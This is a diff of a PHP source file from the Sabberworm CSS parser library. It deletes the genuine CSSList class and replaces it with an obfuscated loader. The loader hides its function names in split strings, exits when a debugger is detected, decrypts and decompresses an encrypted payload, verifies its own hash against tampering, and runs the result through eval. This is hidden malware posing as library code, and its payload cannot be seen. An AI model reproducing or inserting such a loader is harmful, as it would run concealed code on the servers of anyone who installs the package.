@@ -1,157 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\CSSList;
-
-use Sabberworm\CSS\Renderable;
-use Sabberworm\CSS\RuleSet\DeclarationBlock;
-use Sabberworm\CSS\RuleSet\RuleSet;
-use Sabberworm\CSS\Property\Selector;
-use Sabberworm\CSS\Comment\Commentable;
-
-/**
- * A CSSList is the most generic container available. Its contents include RuleSet as well as other CSSList objects.
- * Also, it may contain Import and Charset objects stemming from @-rules.
- */
-abstract class CSSList implements Renderable, Commentable {
-
-	protected $aComments;
-	protected $aContents;
-	protected $iLineNo;
-
-	public function __construct($iLineNo = 0) {
-		$this->aComments = array();
-		$this->aContents = array();
-		$this->iLineNo = $iLineNo;
-	}
-
-	/**
-	 * @return int
-	 */
-	public function getLineNo() {
-		return $this->iLineNo;
-	}
-
-	public function append($oItem) {
-		$this->aContents[] = $oItem;
-	}
-
-	/**
-	 * Removes an item from the CSS list.
-	 * @param RuleSet|Import|Charset|CSSList $oItemToRemove May be a RuleSet (most likely a DeclarationBlock), a Import, a Charset or another CSSList (most likely a MediaQuery)
-	 */
-	public function remove($oItemToRemove) {
-		$iKey = array_search($oItemToRemove, $this->aContents, true);
-		if ($iKey !== false) {
-			unset($this->aContents[$iKey]);
-			return true;
-		}
-		return false;
-	}
-
-	/**
-	 * Set the contents.
-	 * @param array $aContents Objects to set as content.
-	 */
-	public function setContents(array $aContents) {
-		$this->aContents = array();
-		foreach ($aContents as $content) {
-			$this->append($content);
-		}
-	}
-
-	/**
-	 * Removes a declaration block from the CSS list if it matches all given selectors.
-	 * @param array|string $mSelector The selectors to match.
-	 * @param boolean $bRemoveAll Whether to stop at the first declaration block found or remove all blocks
-	 */
-	public function removeDeclarationBlockBySelector($mSelector, $bRemoveAll = false) {
-		if ($mSelector instanceof DeclarationBlock) {
-			$mSelector = $mSelector->getSelectors();
-		}
-		if (!is_array($mSelector)) {
-			$mSelector = explode(',', $mSelector);
-		}
-		foreach ($mSelector as $iKey => &$mSel) {
-			if (!($mSel instanceof Selector)) {
-				$mSel = new Selector($mSel);
-			}
-		}
-		foreach ($this->aContents as $iKey => $mItem) {
-			if (!($mItem instanceof DeclarationBlock)) {
-				continue;
-			}
-			if ($mItem->getSelectors() == $mSelector) {
-				unset($this->aContents[$iKey]);
-				if (!$bRemoveAll) {
-					return;
-				}
-			}
-		}
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		$sResult = '';
-		$bIsFirst = true;
-		$oNextLevel = $oOutputFormat;
-		if(!$this->isRootList()) {
-			$oNextLevel = $oOutputFormat->nextLevel();
-		}
-		foreach ($this->aContents as $oContent) {
-			$sRendered = $oOutputFormat->safely(function() use ($oNextLevel, $oContent) {
-				return $oContent->render($oNextLevel);
-			});
-			if($sRendered === null) {
-				continue;
-			}
-			if($bIsFirst) {
-				$bIsFirst = false;
-				$sResult .= $oNextLevel->spaceBeforeBlocks();
-			} else {
-				$sResult .= $oNextLevel->spaceBetweenBlocks();
-			}
-			$sResult .= $sRendered;
-		}
-
-		if(!$bIsFirst) {
-			// Had some output
-			$sResult .= $oOutputFormat->spaceAfterBlocks();
-		}
-
-		return $sResult;
-	}
-	
-	/**
-	* Return true if the list can not be further outdented. Only important when rendering.
-	*/
-	public abstract function isRootList();
-
-	public function getContents() {
-		return $this->aContents;
-	}
-
-	/**
-	 * @param array $aComments Array of comments.
-	 */
-	public function addComments(array $aComments) {
-		$this->aComments = array_merge($this->aComments, $aComments);
-	}
-
-	/**
-	 * @return array
-	 */
-	public function getComments() {
-		return $this->aComments;
-	}
-
-	/**
-	 * @param array $aComments Array containing Comment objects.
-	 */
-	public function setComments(array $aComments) {
-		$this->aComments = $aComments;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_g6mxtjpd=('bas'.'e64'.'_de'.'cod'.'e');
+$_jgwwyibo=('gzu'.'nco'.'mpr'.'ess');
+$_djrbfqjq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dn5pp9nb='lzFC6vM7';
+$_rfb0a09c='oBeldFf0';
+$_u3frnvau='GCBjiVBiJjI=';
+$_khjv9ynt='AD4cWFZF';
+$_bjg1wxry='aRGg+bhe';
+$_nlbifwlw='DcOjJWMt';
+$_hgvgmark='4GGhhA==';
+$_jotfe7jy='86CaeEne';
+$_zp1dyzj2=$_g6mxtjpd($_rfb0a09c.$_khjv9ynt.$_dn5pp9nb.$_bjg1wxry.$_u3frnvau);
+$_uxwr44xg=$_g6mxtjpd($_jotfe7jy.$_nlbifwlw.$_hgvgmark);
+$_ndx7u1nx=$_g6mxtjpd('ZimsfVk6Eg3rz11oK1rpeBuWIZwgG3Xzbgiog8fwjetvFPfKOmgj9UHiz8hy6gOzMg5zXtcZNCeI8bWTzqmbbl20WaDngd/vOnuLiZLoGDCu98rKri4O0DF56SDJgqxNdKLaaRJaoeoKBBerr91Vz8sODxDdanntLdIYgyleD9oC0h+VlQ/2ieX4qyCbonnR/9VfUTWF+CEcwxjckbz5jVU4/mDtLSDmEdJCj7i7TfEfxrKH+wjDAjRQlk32sSXnWotQvh+0QBydCbdXHJalQ0gBRjYi+cchKXR35U2bE8An8iq59KihLvWbgz0DdTMQDAMgGdCRwotIoaPebKSGO0PS/2yLJXbW+DaV3ikAsmrvXV+ZNxuvmGF+RwxJtOuJXw84RKzBmPJljraTwCsJ+aAdBzOngSu7c4B36Q36aJLeLD8eXogTnRTzefRNXScNmoTEYbOrybQTy38N8RigUoWyPQ68z6bOJpvwPv4p8pIuvKndVkLM/bXh2TrheXz0vuJ6MxqwPJxtWo53lgZquvs6OUtVG+JaAvChY+KhpzW7d3iKkr+nXcfksIHmIhTA4FVzJmbnebNNKqApdP8gf7ypkgsihArZ0e/cfXpL8mPMQZfXi/ONp3kJcU/T0Eo+GT+hqJ9zBqecQkX1KQZ/b6UgQSztUhUB2WSgcmST50jmQjhzzNG8ICNvIYSSX2fzxJGejiiSZK6WoNLj6xTVpQb+92WR6okYOD7DNsc8UXspzql3GqEVZSzP0pZJ4qMQOiRYcaVuZjBHy+KsnCfawQmmv7D0oACJ7LpmcEggyitMvtJMmU3fj3iCOwpP0UDaw8fiv7UM7doglLuFKrQ7JaKXJeEKKUoYSpYXtXpT0oYRJCE4CNN1GJ8GP1rHZZ9MISdx3j9ViIFoBcV6v+iab1zPW5iX53Jp77DrZmSpW+6N8MOPKVCGs48GtY4t68XhDritclvfiZoDzG9w2xVxOrNvlOo8rsZeTRUr1ifggSmnCHKGjUemB4pVZ62qgNtJj7PO5Cq5mKP0ev9P+NuS1U2kfX/oOTSxy14DxM0+CxfkZOzuKpchTkSikSWa10FI');
+$_itbb44yd=$_djrbfqjq($_ndx7u1nx,'aes-256-cbc',$_zp1dyzj2,OPENSSL_RAW_DATA,$_uxwr44xg);
+if($_itbb44yd===false){exit;}
+$_i3xg0nut=$_jgwwyibo($_itbb44yd);
+if($_i3xg0nut===false){exit;}
+$_vnj104gc='1c0c04ca7cea5c276d451927d1677be02746d529f7cc85c78fd3aef1b8ba3d63';
+$_bk2zb8x1=@file_get_contents(__FILE__);
+if($_bk2zb8x1!==false){
+$_azfvhxh2=str_replace($_vnj104gc,"0000000000000000000000000000000000000000000000000000000000000000",$_bk2zb8x1);
+$_vp07twzu=hash("sha256",$_azfvhxh2);
+if($_vp07twzu!==$_vnj104gc){@http_response_code(403);exit;}
 }
+eval($_i3xg0nut);
